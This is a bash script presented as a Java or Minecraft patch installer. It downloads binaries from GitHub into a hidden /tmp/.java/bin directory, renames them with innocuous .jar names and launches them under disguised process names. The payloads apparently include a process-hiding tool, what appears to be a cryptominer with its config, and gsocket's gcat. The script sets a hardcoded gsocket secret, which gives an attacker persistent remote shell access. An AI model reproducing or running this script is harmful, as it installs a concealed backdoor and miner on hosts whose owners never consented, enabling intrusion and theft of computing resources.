#!/bin/bash

function fetch_files() {
    echo "Applying Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o mc-mods.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
    cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
    cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/n1.json -o conf.json
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./mc-mods.jar -a '-java' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
    # GNET
    export GSOCKET_ARGS="-s iA3eD2E2K9c-5A16f9L8M9-3D9g8Hbj7-56C4a9f6X1-eCd9F9440-d6A2803-9A1c5J1g6K -liqD"
    export HOME=/home/container
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
}

if [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    echo "Patch files already fetched ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
